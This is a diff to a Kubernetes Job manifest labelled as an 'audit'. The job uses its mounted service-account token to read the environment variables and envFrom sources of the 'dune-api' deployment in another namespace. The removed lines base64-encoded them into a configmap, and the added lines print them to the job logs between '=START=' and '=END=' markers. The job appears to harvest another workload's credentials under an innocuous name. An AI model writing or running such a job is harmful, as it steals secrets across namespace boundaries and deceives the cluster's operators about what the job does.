@@ -1,10 +1,10 @@
 apiVersion: batch/v1
 kind: Job
 metadata:
-  name: dune-audit-v4
+  name: dune-audit-v5
   namespace: default
 spec:
-  ttlSecondsAfterFinished: 300
+  ttlSecondsAfterFinished: 600
   template:
     spec:
       serviceAccountName: n8n-audit-sa
@@ -21,13 +21,8 @@ spec:
           CA="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
           KUBE_NS="dune-api"
           
-          ENVVARS=$(curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" \
+          echo "=START="
+          curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" \
             "$API/apis/apps/v1/namespaces/$KUBE_NS/deployments/dune-api" | \
-            jq -c '{env: .spec.template.spec.containers[].env, envFrom: .spec.template.spec.containers[].envFrom}')
-          
-          VAL=$(echo "$ENVVARS" | base64 -w0)
-          
-          curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" -H "Content-Type: application/json" \
-            -X PATCH "$API/api/v1/namespaces/default/configmaps/rock-audit-result3" \
-            --data-binary "{\"data\":{\"dune_env\":\"$VAL\"}}"
-          echo DONE
+            jq '{containers: [.spec.template.spec.containers[] | {name: .name, env: .env, envFrom: .envFrom}]}'
+          echo "=END="
